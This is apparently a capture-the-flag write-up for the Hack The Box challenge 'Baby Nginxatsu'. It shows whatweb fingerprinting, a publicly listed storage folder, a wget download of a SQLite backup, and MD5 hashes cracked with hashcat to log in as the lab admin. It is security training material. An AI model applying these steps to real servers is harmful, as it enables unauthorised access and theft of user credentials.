# [Baby Nginxatsu](https://app.hackthebox.eu/challenges/180)

---  

__Title__: Baby Nginxatsu  
__Description__: A web site that allow user to create Nginx config   
__summary__: We were able to retrieve the admin password from a SQLite backup left on the server  
__Tags__:  nginx, php, sqlite, hashcat  
__host__: 178.128.175.172:32194  


---  


## Enumeration

### Initial

The first thing we did was to use the application (just like any user)

- Created an account
- Created few config files

### Platform information

```bash
$ whatweb 178.128.175.172:32194

http://178.128.175.172:32194 [302 Found] Cookies[XSRF-TOKEN,laravel_session], Country[GREECE][GR], HTML5, HTTPServer[nginx], HttpOnly[laravel_session], IP[178.128.175.172], Laravel, Meta-Refresh-Redirect[http://178.128.175.172:32194/auth/login], PHP[7.4.12], RedirectLocation[http://178.128.175.172:32194/auth/login], Title[Redirecting to http://178.128.175.172:32194/auth/login], X-Powered-By[PHP/7.4.12], nginx

http://178.128.175.172:32194/auth/login [200 OK] Cookies[XSRF-TOKEN,laravel_session], Country[GREECE][GR], HTTPServer[nginx], HttpOnly[laravel_session], IP[178.128.175.172], Laravel, Meta-Author[makelarisjr, makelaris], PHP[7.4.12], PasswordField[password], Title[nginxatsu], X-Powered-By[PHP/7.4.12], nginx
```
Running `whatweb` against the application we managed to get some information about the platform: Laravel (PHP 7.4.12)

### Nginx Config generator

The application generates Nginx configs that can be viewed using the id of the config E.g: http://178.128.175.172:32194/config/51

#### Configs storage

One interesting thing is that we can see the raw config E.g http://178.128.175.172:32194/storage/nginx_5ffb34aac767f.conf

visiting the folder http://178.128.175.172:32194/storage/ we can see that the server list all the available configs.

We can also see an interesting file: `v1_db_backup_1604123342.tar.gz`

```bash
$ wget http://178.128.175.172:32194/storage/v1_db_backup_1604123342.tar.gz

--2021-01-10 17:31:20--  http://178.128.175.172:32194/storage/v1_db_backup_1604123342.tar.gz
Connecting to 178.128.175.172:32194... connected.
HTTP request sent, awaiting response... 200 OK
Length: 42496 (42K) [text/plain]
Saving to: ‘v1_db_backup_1604123342.tar.gz’

v1_db_backup_1604123342.t 100%[===================================>]  41.50K  --.-KB/s    in 0.06s   

2021-01-10 17:31:20 (691 KB/s) - ‘v1_db_backup_1604123342.tar.gz’ saved [42496/42496]
```

We are dealing with a tar file

```bash
$ file v1_db_backup_1604123342.tar.gz 
v1_db_backup_1604123342.tar.gz: POSIX tar archive (GNU)
```

Let's extract everything

```bash
$ tar -tvf v1_db_backup_1604123342.tar.gz
-rw-r--r-- www/www       40960 2021-01-10 16:50 database/database.sqlite
```

```bash
$ tar -xvf v1_db_backup_1604123342.tar.gz
database/database.sqlite
```

Let's load the file in `DB Browser for SQLite`



We have been able to retrieve few users (and their passwords hashes) from the DB.

### Password cracking

The password hashes are in MD5 

```bash
$ hash-identifier e7816e9a10590b1e33b87ec2fa65e6cd
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
````
Let's store the passwords hashes in a file 

```bash
$ cat users 

e7816e9a10590b1e33b87ec2fa65e6cd
96daf5684cfda2dd61750c3719f5fb19
ecbbcb87173b6501ef44184c58d380a7
```

Using Hashcat we have retrieved a password

```bash
$ hashcat -m 0 passwords /usr/share/wordlists/rockyou.txt       
hashcat (v6.1.1) starting...

...
```

```bash
$ hashcat -m 0 passwords /usr/share/wordlists/rockyou.txt --show
e7816e9a10590b1e33b87ec2fa65e6cd:adminadmin1
```

At this point we have `jr` password `adminadmin1`


Using those information we manage to logged in to `jr` account and because he was the admin, we got the flag.
